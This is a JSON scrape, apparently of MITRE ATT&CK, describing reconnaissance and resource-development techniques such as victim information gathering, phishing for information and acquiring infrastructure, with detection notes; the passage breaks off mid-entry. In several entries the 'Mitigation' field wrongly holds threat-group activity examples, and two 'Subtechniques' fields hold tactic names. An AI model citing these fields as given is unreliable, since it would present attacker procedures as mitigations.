[
  {
    "Title": "Gather Victim Host Information",
    "Code": "T1592",
    "Description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1] Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
      }
    ],
    "Detection": [
      {
        "id": "DS0035",
        "dsource": "Internet Scan",
        "dcomp": "Response Content",
        "detects": "Internet scanners may be used to look for patterns associated with malicious content designed to collect host information from visitors.[2][1]Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1592.001",
        "name": "Hardware"
      },
      {
        "id": "T1592.002",
        "name": "Software"
      },
      {
        "id": "T1592.003",
        "name": "Firmware"
      },
      {
        "id": "T1592.004",
        "name": "Client Configurations"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Active Scanning",
    "Code": "T1595",
    "Description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.[1][2] Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1595.001",
        "name": "Scanning IP Blocks"
      },
      {
        "id": "T1595.002",
        "name": "Vulnerability Scanning"
      },
      {
        "id": "T1595.003",
        "name": "Wordlist Scanning"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Gather Victim Identity Information",
    "Code": "T1589",
    "Description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about users could also be enumerated via other active means (i.e. Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.[1] Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[2][3][4][5][6][7][8][9]Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
    "Mitigation": [
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has conducted targeted surveillance against activists and bloggers.[10]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has researched employees to target for social engineering attacks.[11]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has identified specific potential victims at targeted organizations.[12]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has gathered detailed information of target employees to enhance their social engineering lures.[13]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.[14]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "For Operation Dream Job, Lazarus Group conducted extensive reconnaissance research on potential targets.[15]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors targeted people based on their organizational roles and privileges.[16]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1589.001",
        "name": "Credentials"
      },
      {
        "id": "T1589.002",
        "name": "Email Addresses"
      },
      {
        "id": "T1589.003",
        "name": "Employee Names"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Gather Victim Network Information",
    "Code": "T1590",
    "Description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases).[1][2][3] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",
    "Mitigation": [
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.[4]"
      }
    ],
    "Detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
    "Subtechniques": [
      {
        "id": "T1590.001",
        "name": "Domain Properties"
      },
      {
        "id": "T1590.002",
        "name": "DNS"
      },
      {
        "id": "T1590.003",
        "name": "Network Trust Dependencies"
      },
      {
        "id": "T1590.004",
        "name": "Network Topology"
      },
      {
        "id": "T1590.005",
        "name": "IP Addresses"
      },
      {
        "id": "T1590.006",
        "name": "Network Security Appliances"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Gather Victim Org Information",
    "Code": "T1591",
    "Description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1][2] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).",
    "Mitigation": [
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others.[3]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.[4]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets.[5]"
      }
    ],
    "Detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
    "Subtechniques": [
      {
        "id": "T1591.001",
        "name": "Determine Physical Locations"
      },
      {
        "id": "T1591.002",
        "name": "Business Relationships"
      },
      {
        "id": "T1591.003",
        "name": "Identify Business Tempo"
      },
      {
        "id": "T1591.004",
        "name": "Identify Roles"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Phishing for Information",
    "Code": "T1598",
    "Description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.[1][2][3][4][5] Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.[6]Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing[7] the identity of the sender which can be used to fool both the human recipient as well as automated security tools.[8] Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules).[9][10]",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used spearphishing to compromise credentials.[11][12]"
      },
      {
        "id": "G1015",
        "name": "Scattered Spider",
        "description": "Scattered Spider has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.[13]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails.[14]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[15][16]When it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).Monitor call logs from corporate devices to identify patterns of potential voice phishing, such as calls to/from known malicious phone numbers."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1598.001",
        "name": "Spearphishing Service"
      },
      {
        "id": "T1598.002",
        "name": "Spearphishing Attachment"
      },
      {
        "id": "T1598.003",
        "name": "Spearphishing Link"
      },
      {
        "id": "T1598.004",
        "name": "Spearphishing Voice"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Search Closed Sources",
    "Code": "T1597",
    "Description": "Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.[1] Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.[2]Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
    "Mitigation": [
      {
        "id": "G1011",
        "name": "EXOTIC LILY",
        "description": "EXOTIC LILY has searched for information on targeted individuals on business databases including RocketReach and CrunchBase.[3]"
      }
    ],
    "Detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
    "Subtechniques": [
      {
        "id": "T1597.001",
        "name": "Threat Intel Vendors"
      },
      {
        "id": "T1597.002",
        "name": "Purchase Technical Data"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Search Open Technical Databases",
    "Code": "T1596",
    "Description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.[1][2][3][4][5][6][7]Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
      }
    ],
    "Detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
    "Subtechniques": [
      {
        "id": "T1596.001",
        "name": "DNS/Passive DNS"
      },
      {
        "id": "T1596.002",
        "name": "WHOIS"
      },
      {
        "id": "T1596.003",
        "name": "Digital Certificates"
      },
      {
        "id": "T1596.004",
        "name": "CDNs"
      },
      {
        "id": "T1596.005",
        "name": "Scan Databases"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Search Open Websites/Domains",
    "Code": "T1593",
    "Description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.[1][2][3]Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: External Remote Services or Phishing).",
    "Mitigation": [
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team researched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails.[4]"
      }
    ],
    "Detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
    "Subtechniques": [
      {
        "id": "T1593.001",
        "name": "Social Media"
      },
      {
        "id": "T1593.002",
        "name": "Search Engines"
      },
      {
        "id": "T1593.003",
        "name": "Code Repositories"
      }
    ],
    "Tactic": "\nReconnaissance"
  },
  {
    "Title": "Search Victim-Owned Websites",
    "Code": "T1594",
    "Description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships.[1]Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Trusted Relationship or Phishing).",
    "Mitigation": [
      {
        "id": "G1011",
        "name": "EXOTIC LILY",
        "description": "EXOTIC LILY has used contact forms on victim websites to generate phishing e-mails.[2]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has searched for information on the target company's website.[3]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has conducted research against potential victim websites as part of its operational planning.[4]"
      },
      {
        "id": "G0122",
        "name": "Silent Librarian",
        "description": "Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.[5][6][7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields."
      }
    ],
    "Subtechniques": "\nReconnaissance"
  },
  {
    "Title": "Acquire Access",
    "Code": "T1650",
    "Description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.[1][2][3] In some cases, adversary groups may form partnerships to share compromised systems with each other.[4]Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a \"load\" that can be used to install additional malware for paying customers.[1]By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.[1][2]In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.Note: while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
      }
    ],
    "Detection": "Much of this takes place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
    "Subtechniques": "\nResource Development"
  },
  {
    "Title": "Acquire Infrastructure",
    "Code": "T1583",
    "Description": "Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.[1] Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services.[2][3][4] Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
      }
    ],
    "Detection": [
      {
        "id": "DS0038",
        "dsource": "Domain Name",
        "dcomp": "Active DNS",
        "detects": "Monitor for queried domain name system (DNS) registry data that may buy, lease, or rent infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Domain Registration",
        "detects": "Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Passive DNS",
        "detects": "Monitor for logged domain name system (DNS) data that may buy, lease, or rent infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      },
      {
        "id": "DS0035",
        "dsource": "Internet Scan",
        "dcomp": "Response Content",
        "detects": "Once adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[5][6][7] Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Response Metadata",
        "detects": "Monitor for contextual data about an Internet-facing resource gathered from a scan, such as running services or ports that may buy, lease, or rent infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1583.001",
        "name": "Domains"
      },
      {
        "id": "T1583.002",
        "name": "DNS Server"
      },
      {
        "id": "T1583.003",
        "name": "Virtual Private Server"
      },
      {
        "id": "T1583.004",
        "name": "Server"
      },
      {
        "id": "T1583.005",
        "name": "Botnet"
      },
      {
        "id": "T1583.006",
        "name": "Web Services"
      },
      {
        "id": "T1583.007",
        "name": "Serverless"
      },
      {
        "id": "T1583.008",
        "name": "Malvertising"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Compromise Accounts",
    "Code": "T1586",
    "Description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.[1][2] Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "DS0021",
        "dsource": "Persona",
        "dcomp": "Social Media",
        "detects": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing)."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1586.001",
        "name": "Social Media Accounts"
      },
      {
        "id": "T1586.002",
        "name": "Email Accounts"
      },
      {
        "id": "T1586.003",
        "name": "Cloud Accounts"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Compromise Infrastructure",
    "Code": "T1584",
    "Description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.[1][2][3][4] Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns.[5] Additionally, adversaries may also compromise infrastructure to support Proxy and/or proxyware services.[6][7]By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.[8]",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
      }
    ],
    "Detection": [
      {
        "id": "DS0038",
        "dsource": "Domain Name",
        "dcomp": "Active DNS",
        "detects": "Monitor for queried domain name system (DNS) registry data that may compromise third-party infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Domain Registration",
        "detects": "Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Passive DNS",
        "detects": "Monitor for logged domain name system (DNS) data that may compromise third-party infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      },
      {
        "id": "DS0035",
        "dsource": "Internet Scan",
        "dcomp": "Response Content",
        "detects": "Once adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[9][10][11]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Response Metadata",
        "detects": "Monitor for contextual data about an Internet-facing resource gathered from a scan, such as running services or ports that may compromise third-party infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1584.001",
        "name": "Domains"
      },
      {
        "id": "T1584.002",
        "name": "DNS Server"
      },
      {
        "id": "T1584.003",
        "name": "Virtual Private Server"
      },
      {
        "id": "T1584.004",
        "name": "Server"
      },
      {
        "id": "T1584.005",
        "name": "Botnet"
      },
      {
        "id": "T1584.006",
        "name": "Web Services"
      },
      {
        "id": "T1584.007",
        "name": "Serverless"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Develop Capabilities",
    "Code": "T1587",
    "Description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.[1][2][3][4]As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
    "Mitigation": [
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky created and used a mailing toolkit to use in spearphishing attacks.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0035",
        "dsource": "Internet Scan",
        "dcomp": "Response Content",
        "detects": "Consider use of services that may aid in the tracking of capabilities, such as certificates, in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of information to uncover other adversary infrastructure.[6] Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
      },
      {
        "id": "DS0004",
        "dsource": "Malware Repository",
        "dcomp": "Malware Content",
        "detects": "Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Malware Metadata",
        "detects": "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1587.001",
        "name": "Malware"
      },
      {
        "id": "T1587.002",
        "name": "Code Signing Certificates"
      },
      {
        "id": "T1587.003",
        "name": "Digital Certificates"
      },
      {
        "id": "T1587.004",
        "name": "Exploits"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Establish Accounts",
    "Code": "T1585",
    "Description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.[1][2]For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.[1][2]Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing.[3]",
    "Mitigation": [
      {
        "id": "G0025",
        "name": "APT17",
